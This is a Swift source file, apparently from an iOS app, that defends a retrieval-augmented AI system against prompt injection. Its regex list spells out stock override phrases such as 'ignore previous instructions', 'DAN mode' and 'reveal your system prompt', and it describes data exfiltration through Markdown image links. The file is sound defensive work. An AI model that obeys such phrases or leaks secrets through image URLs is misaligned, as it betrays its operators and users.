//
//  PromptSanitizer.swift
//  ZhiYu
//
//  Created by Antigravity on 2026/05/23.
//  Copyright © 2026 WangChong. All rights reserved.
//
//  系统层级：[L0.5] 系统集成层
//  核心职责：Prompt 注入防御：恶意指令检测拦截、Unicode 归一化、DLP 图片外链净化、上下文沙箱包裹。
//
import Foundation

/// 智能 Prompt 防御净化层 (PromptSanitizer)
/// 专门针对 RAG 系统中的 Prompt 注入漏洞及 DLP 数据外泄提供物理屏障拦截。
final class PromptSanitizer: Sendable {
    /// 全局唯一的线程安全单例
    static let shared = PromptSanitizer()
    
    private init() {}
    
    // MARK: - 恶意注入检测正则列表
    
    /// 恶意 System Override 指令特征正则表达式库
    /// - Note: VULN-011 修复：扩展同义词覆盖 + Unicode 归一化前置处理，降低绕过风险
    private let injectionPatterns: [String] = [
        // 原始模式：ignore (all) previous/system/prior instructions/directives/prompts/rules
        #"(?i)ignore\s+(?:all\s+)?(?:previous|system|prior)\s+(?:instructions|directives|prompts|rules)"#,
        // VULN-011 修复：新增同义词变体覆盖
        #"(?i)disregard\s+(?:all\s+)?(?:previous|prior|system|above)\s+(?:instructions|directives|prompts|rules|context)"#,
        #"(?i)forget\s+(?:all\s+)?(?:previous|prior|above)\s+(?:instructions|directives|context|rules)"#,
        #"(?i)override\s+(?:the\s+)?(?:system|previous|prior)\s+(?:instructions|directives|rules|prompt)"#,
        #"(?i)stop\s+following\s+(?:your\s+)?(?:instructions|directives|rules)"#,
        #"(?i)you\s+(?:must\s+)?now\s+act\s+as"#,
        #"(?i)pretend\s+(?:to\s+be|you\s+are)"#,
        #"(?i)system\s+override"#,
        #"(?i)bypass\s+(?:the\s+)?(?:safety|security|filter|restriction)(?:\s+check)?"#,
        #"(?i)ignore\s+the\s+context\s+sandbox"#,
        #"(?i)jailbreak\s+mode"#,
        #"(?i)developer\s+mode"#,
        // 审查修复 LOW-3: 添加 (?i) 标志，大小写不敏感匹配
        #"(?i)DAN\s+mode"#,
        // 审查修复 LOW-2: 收紧数据外泄拦截 — 仅拦截向外部 URL 发送敏感数据的模式
        // 避免误判合法的 "fetch http://example.com" 等正常 URL 处理指令
        #"(?i)(?:send|post|upload|exfiltrate)\s+(?:your\s+)?(?:system\s+)?(?:prompt|instructions|rules|context|api[_\s-]?key|secret|token)(?:\s+to\s+)?(?:https?://|ftp://)"#,
        #"(?i)reveal\s+(?:your\s+)?(?:system\s+)?(?:prompt|instructions|rules)"#
    ]
    
    // MARK: - API 接口
    
    /// 对用户的 Prompt 进行安全性拦截与消毒
    /// - Parameter prompt: 原始 Prompt 输入
    /// - Returns: 净化后的安全 Prompt。如果包含高风险注入，则抹除敏感注入部分并发出安全警告。
    func sanitize(_ prompt: String) -> String {
        // 审查修复 LOW-1: Unicode NFKC 归一化仅用于正则匹配阶段
        // 匹配命中后对原始 prompt（非归一化文本）做恶意片段替换，保留用户原始输入格式
        let normalizedPrompt = prompt.precomposedStringWithCompatibilityMapping
        var sanitized = prompt

        // 依次用正则匹配并拦截/替换有毒指令，确保安全
        for pattern in injectionPatterns {
            if let regex = try? NSRegularExpression(pattern: pattern, options: []) {
                // 在归一化文本上匹配，定位恶意片段
                let normalizedRange = NSRange(location: 0, length: normalizedPrompt.utf16.count)
                guard regex.firstMatch(in: normalizedPrompt, options: [], range: normalizedRange) != nil else {
                    continue
                }

                // 记录安全警报日志
                Logger.shared.addLog(
                    action: .error,
                    target: CoreConstants.SecurityLogTarget.promptSanitizer,
                    details: L10n.Security.promptInjectionLog(pattern),
                    module: CoreConstants.Security.logModule
                )

                // 将恶意指令替换为无害的安全警告占位符
                // 在原始 prompt 上替换匹配到的范围
                let originalRange = NSRange(location: 0, length: sanitized.utf16.count)
                sanitized = regex.stringByReplacingMatches(
                    in: sanitized,
                    options: [],
                    range: originalRange,
                    withTemplate: L10n.Security.promptInjectionPlaceholder
                )
            }
        }

        return sanitized
    }
    
    /// 过滤召回上下文中的动态数据泄露链接 (Data Loss Prevention)
    /// 主要拦截类似 `![leak](https://evil.com/leak?data=...)` 形式的恶意动态 Markdown 图像外链注入。
    /// - Parameter context: 召回的原始上下文内容
    /// - Returns: DLP 净化后的安全上下文
    func sanitizeContext(_ context: String) -> String {
        var sanitized = context
        
        // 匹配 Markdown 图片语法正则，特别关注包含网络主机的动态图片外链
        let markdownImagePattern = #"!\[([^\]]*)\]\((https?://[^)]+)\)"#
        
        if let regex = try? NSRegularExpression(pattern: markdownImagePattern, options: []) {
            let range = NSRange(location: 0, length: sanitized.utf16.count)
            
            // 将所有检测到的动态网络图像替换为本地安全卡片提示，物理隔绝 HTTP 外发请求
            sanitized = regex.stringByReplacingMatches(
                in: sanitized,
                options: [],
                range: range,
                withTemplate: L10n.Security.dlpImagePlaceholder
            )
        }
        
        return sanitized
    }
    
    /// 将召回的上下文安全包裹至 XML 金沙箱（Sandboxing）
    /// - Parameter content: 经过 DLP 净化后的 Context 文本
    /// - Returns: 包裹了严密指令的安全 XML 上下文
    func wrapInSandbox(_ content: String) -> String {
        let cleanContent = sanitizeContext(content)
        
        // 构造由 String Catalog 强类型多语言自适应支持的物理金沙箱
        return L10n.Security.sandboxInstructions(with: cleanContent)
    }
}
